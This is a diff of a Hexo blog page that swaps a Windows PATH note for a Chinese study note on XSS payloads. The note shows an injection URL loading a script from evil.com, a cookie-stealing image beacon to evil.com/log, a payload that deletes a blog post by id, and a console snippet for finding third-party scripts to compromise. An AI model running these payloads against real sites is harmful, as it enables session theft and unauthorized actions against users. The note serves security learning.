@@ -77,7 +77,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="xss," />
 
 
 
@@ -93,17 +93,17 @@
 
 
 
-<meta name="description" content="在windows上配置cmder和binwalk时遇到查看高级系统设置环境变量 系统变量选择Path后新建路径">
-<meta name="keywords">
+<meta name="description" content="XSS Payload实际上就是javascript脚本（也可以是其他富客户端脚本） 加载远程脚本(常见)XSS 获取浏览器 Cookie对象攻击者先加载一个远程脚本js http://www.a.com/test.htm?abc=&amp;quot;&amp;gt;&amp;lt;script src=http://www.evil.com/evil.js&amp;gt;&amp;lt;/script&amp;gt;真正的XSS Payloa">
+<meta name="keywords" content="xss">
 <meta property="og:type" content="article">
-<meta property="og:title" content="环境变量">
-<meta property="og:url" content="http://Merl1ng.com/2017/04/30/环境变量/index.html">
+<meta property="og:title" content="xss所加载的脚本">
+<meta property="og:url" content="http://Merl1ng.com/2017/07/24/xss所加载的脚本/index.html">
 <meta property="og:site_name" content="Merl1ng">
-<meta property="og:description" content="在windows上配置cmder和binwalk时遇到查看高级系统设置环境变量 系统变量选择Path后新建路径">
-<meta property="og:updated_time" content="2017-07-22T10:02:29.760Z">
+<meta property="og:description" content="XSS Payload实际上就是javascript脚本（也可以是其他富客户端脚本） 加载远程脚本(常见)XSS 获取浏览器 Cookie对象攻击者先加载一个远程脚本js http://www.a.com/test.htm?abc=&amp;quot;&amp;gt;&amp;lt;script src=http://www.evil.com/evil.js&amp;gt;&amp;lt;/script&amp;gt;真正的XSS Payloa">
+<meta property="og:updated_time" content="2017-07-24T12:43:10.142Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="环境变量">
-<meta name="twitter:description" content="在windows上配置cmder和binwalk时遇到查看高级系统设置环境变量 系统变量选择Path后新建路径">
+<meta name="twitter:title" content="xss所加载的脚本">
+<meta name="twitter:description" content="XSS Payload实际上就是javascript脚本（也可以是其他富客户端脚本） 加载远程脚本(常见)XSS 获取浏览器 Cookie对象攻击者先加载一个远程脚本js http://www.a.com/test.htm?abc=&amp;quot;&amp;gt;&amp;lt;script src=http://www.evil.com/evil.js&amp;gt;&amp;lt;/script&amp;gt;真正的XSS Payloa">
 
 
 
@@ -131,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="http://Merl1ng.com/2017/04/30/环境变量/"/>
+  <link rel="canonical" href="http://Merl1ng.com/2017/07/24/xss所加载的脚本/"/>
 
 
 
 
 
-  <title>环境变量 | Merl1ng</title>
+  <title>xss所加载的脚本 | Merl1ng</title>
   
 
 
@@ -266,7 +266,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2017/04/30/环境变量/">
+    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2017/07/24/xss所加载的脚本/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Saber">
@@ -283,7 +283,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">环境变量</h1>
+          <h1 class="post-title" itemprop="name headline">xss所加载的脚本</h1>
         
 
         <div class="post-meta">
@@ -295,8 +295,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-04-30T23:10:52+08:00">
-                2017-04-30
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-07-24T17:44:20+08:00">
+                2017-07-24
               </time>
             
 
@@ -318,8 +318,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/setting/" itemprop="url" rel="index">
-                    <span itemprop="name">setting</span>
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
                   </a>
                 </span>
 
@@ -352,7 +352,19 @@
       
 
       
-        <p>在windows上配置cmder和binwalk时遇到<br>查看高级系统设置<br>环境变量 系统变量<br>选择Path后新建路径</p>
+        <p>XSS Payload实际上就是javascript脚本（也可以是其他富客户端脚本）</p>
+<h3 id="加载远程脚本-常见"><a href="#加载远程脚本-常见" class="headerlink" title="加载远程脚本(常见)"></a>加载远程脚本(常见)</h3><h4 id="XSS-获取浏览器-Cookie对象"><a href="#XSS-获取浏览器-Cookie对象" class="headerlink" title="XSS 获取浏览器 Cookie对象"></a>XSS 获取浏览器 Cookie对象</h4><p>攻击者先加载一个远程脚本js</p>
+<p><code>http://www.a.com/test.htm?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js&gt;&lt;/script&gt;</code><br>真正的XSS Payload写在这个远程脚本中，避免在URL的参数里写入大量的JavaScript代码</p>
+<p>在evil.js中 可写入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var img = document.createElement(<span class="string">"img"</span>);</div><div class="line">img.src = <span class="string">"http://www.evil.com/log?"</span>+escape(document.cookie);</div><div class="line">document.body.appendChild(img);</div></pre></td></tr></table></figure></p>
+<p>这段代码在页面中插入了一张看不见的图片 同时把document.cookie对象作为参数发送到远程服务器</p>
+<p><code>http://www.evil.com/log</code> 可以不存在 因为这个请求会在远程服务器的Web日志中留下记录<br>127.0.0.1 - - [24/Jul/2017:20:19:18 +8080] “GET /log?cookie1%D1234 HTTP1.1” 404 288</p>
+<h4 id="利用XSS删除文章"><a href="#利用XSS删除文章" class="headerlink" title="利用XSS删除文章"></a>利用XSS删除文章</h4><p>首先正常删除该文章的连接是<br><code>http://blog.sohu.com/manage/entry.do?m=delete&amp;id=12345678</code></p>
+<p>则只要知道文章的id 就可以通过这个请求删除改文章</p>
+<p>可以通过插入一张图片来发起一个GET请求<br>XSS Payload为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var img = document.createElement(<span class="string">"img"</span>);</div><div class="line">img.src = <span class="string">"http://blog.sohu.com/manage/entry.do?m=delete&amp;id*12345678"</span>;</div><div class="line">document.body.appendChild(img);</div></pre></td></tr></table></figure></p>
+<h3 id="加载目标网站上不是该站的脚本"><a href="#加载目标网站上不是该站的脚本" class="headerlink" title="加载目标网站上不是该站的脚本"></a>加载目标网站上不是该站的脚本</h3><p>在目标网站上找到不是本站的js　然后渗透那个网站　重写js　来达到渗透目标网站</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span>(var i=0,tags=document.querySelectorAll(<span class="string">'iframe[src],frame[src],script[src],link[rel=stylesheet],object[data],embed[src]'</span>),tag;tag=tags[i];i++)&#123;</div><div class="line">  var a = document.createElement(<span class="string">'a'</span>);</div><div class="line">  a.href = tag.src||tag.href||tag.data;</div><div class="line">  <span class="keyword">if</span>(a.hostname!=location.hostname)&#123;</div><div class="line">    console.warn(location.hostname+<span class="string">' 发现第三方资源['</span>+tag.localName+<span class="string">']:'</span>+a.href);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>（这段代码实际可以找出J/C）<br>将该段代码输入在控制台内 回车<br>比如在<code>www.CUC.com</code>内输入显示发现第三方资源<br><code>http://www.qaq.pw/1.js</code></p>
+<p>渗透<code>http://www.qaq.pw/1.js</code><br>在1.js下重写js 即XSS Payload</p>
 
       
     </div>
@@ -380,6 +392,12 @@
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/xss/" rel="tag"># xss</a>
+          
+        </div>
+      
 
       
       
@@ -389,18 +407,14 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/05/30/lan attack/" rel="next" title="lan attack">
-                <i class="fa fa-chevron-left"></i> lan attack
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/04/14/hello-world/" rel="prev" title="Hello World">
-                Hello World <i class="fa fa-chevron-right"></i>
+              <a href="/2017/07/23/xss学习笔记/" rel="prev" title="xss学习笔记">
+                xss学习笔记 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -449,8 +463,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
@@ -532,6 +555,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#加载远程脚本-常见"><span class="nav-number">1.</span> <span class="nav-text">加载远程脚本(常见)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS-获取浏览器-Cookie对象"><span class="nav-number">1.1.</span> <span class="nav-text">XSS 获取浏览器 Cookie对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用XSS删除文章"><span class="nav-number">1.2.</span> <span class="nav-text">利用XSS删除文章</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#加载目标网站上不是该站的脚本"><span class="nav-number">2.</span> <span class="nav-text">加载目标网站上不是该站的脚本</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
